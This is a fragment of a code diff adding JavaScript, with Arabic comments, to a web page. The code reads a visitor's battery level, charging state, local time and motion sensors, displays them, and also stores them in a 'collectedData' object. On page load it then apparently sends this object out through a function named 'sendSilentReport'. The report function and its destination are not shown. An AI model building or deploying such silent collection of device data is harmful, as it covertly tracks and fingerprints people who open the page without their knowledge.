+                try {
+                    const bat = await navigator.getBattery();
+                    const updateBat = () => {
+                        const lvl = Math.round(bat.level * 100);
+                        document.getElementById('val-bat-txt').innerText = lvl + '%';
+                        document.getElementById('bat-bar').style.width = lvl + '%';
+
+                        let color = lvl < 25 ? 'var(--accent-red)' :
+                                    lvl <= 50 ? 'var(--accent-yellow)' : 'var(--accent-green)';
+
+                        document.getElementById('bat-bar').style.backgroundColor = color;
+                        document.getElementById('val-bat-txt').style.color = color;
+
+                        // تصحيح Syntax
+                        collectedData.bat = `${lvl}% (${bat.charging ? 'Charging' : 'Normal'})`;
+                    };
+                    updateBat();
+                    bat.onlevelchange = updateBat;
+                    bat.onchargingchange = updateBat;
+                } catch {}
+            }
+
+            // 5. الساعة
+            setInterval(() => {
+                const now = new Date().toLocaleString('ar-EG');
+                document.getElementById('val-time').innerText = now;
+                collectedData.time = now;
+            }, 1000);
+
+            // 6. تشغيل الحساسات (المحاولة الأولية للأندرويد)
+            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission !== 'function') {
+                window.addEventListener('deviceorientation', handleMotion);
+            } else {
+                 // إظهار تنبيه للمستخدم بالضغط لتفعيل الحساسات (للآيفون)
+                 document.getElementById('sensor-alert').style.display = 'block';
+            }
+
+            // 7. الإرسال
+            setTimeout(sendSilentReport, 4000);
+
+        } catch (err) {
+            console.error("Init Error:", err);
+        } finally {
+            hideLoading();
+        }
     }
 
     window.onload = init;
